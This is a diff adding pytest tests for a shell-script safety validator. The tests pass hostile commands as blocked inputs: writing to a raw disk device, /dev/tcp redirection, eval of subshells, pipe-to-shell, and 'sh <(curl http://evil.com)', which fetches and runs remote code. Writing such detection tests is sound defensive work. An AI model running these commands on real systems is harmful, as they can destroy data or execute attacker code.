@@ -195,3 +195,92 @@ def test_uv_bootstrap_safe():
         "Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression"
     )
     assert validate_rendered_output(content_win, "setup.ps1") == content_win
+
+
+def test_ast_redirection_disk_writes_blocked():
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("echo hello > /dev/nvme0n1", "setup.sh")
+    assert "Dangerous redirection target" in str(exc_info.value)
+
+
+def test_ast_redirection_network_cradles_blocked():
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("echo hello > /dev/tcp/127.0.0.1/80", "setup.sh")
+    assert "Dangerous redirection target" in str(exc_info.value)
+
+
+def test_ast_redirection_subshell_blocked():
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("echo hello > $(get_disk)", "setup.sh")
+    assert "Dynamic redirection target with subshell" in str(exc_info.value)
+
+
+def test_ast_eval_subshell_blocked():
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output('eval "$(echo hello)"', "setup.sh")
+    assert "Eval command with dynamic subshell/substitution" in str(exc_info.value)
+
+
+def test_ast_eval_pipeline_blocked():
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("echo hello | eval", "setup.sh")
+    assert "Eval command used inside a pipeline" in str(exc_info.value)
+
+
+def test_ast_pipe_to_shell_blocked():
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("cat script.sh | sh", "setup.sh")
+    assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)
+
+
+def test_ast_shell_dynamic_arguments_blocked():
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("sh <(curl http://evil.com)", "setup.sh")
+    assert "executed with dynamic subshell/substitution" in str(exc_info.value)
+
+
+def test_syntax_error_blocked_by_shellcheck(monkeypatch):
+    import subprocess
+    from unittest.mock import MagicMock
+
+    mock_result = MagicMock()
+    mock_result.returncode = 1
+    mock_result.stdout = '[{"line": 1, "column": 1, "message": "This if lacks a matching fi.", "code": 1073, "level": "error"}]'
+    mock_result.stderr = ""
+
+    monkeypatch.setattr(subprocess, "run", lambda *args, **kwargs: mock_result)
+
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("if true; then echo 1", "setup.sh")
+    assert "Shellcheck validation failed with warnings" in str(exc_info.value)
+    assert "SC1073" in str(exc_info.value)
+
+
+def test_shellcheck_warnings_fail_validation(monkeypatch):
+    import subprocess
+    from unittest.mock import MagicMock
+
+    mock_result = MagicMock()
+    mock_result.returncode = 1
+    mock_result.stdout = '[{"line": 2, "column": 5, "message": "Double quote to prevent globbing and word splitting.", "code": 2086, "level": "warning"}]'
+    mock_result.stderr = ""
+
+    monkeypatch.setattr(subprocess, "run", lambda *args, **kwargs: mock_result)
+
+    with pytest.raises(SafetyViolationError) as exc_info:
+        validate_rendered_output("echo $var", "setup.sh")
+    assert "Shellcheck validation failed with warnings" in str(exc_info.value)
+    assert "SC2086" in str(exc_info.value)
+
+
+def test_shellcheck_missing_executable_graceful(monkeypatch):
+    import subprocess
+
+    def mock_run(*args, **kwargs):
+        raise FileNotFoundError("shellcheck")
+
+    monkeypatch.setattr(subprocess, "run", mock_run)
+
+    # Should not raise any error, since shellcheck is missing and is skipped
+    content = "echo 'safe content'"
+    assert validate_rendered_output(content, "setup.sh") == content
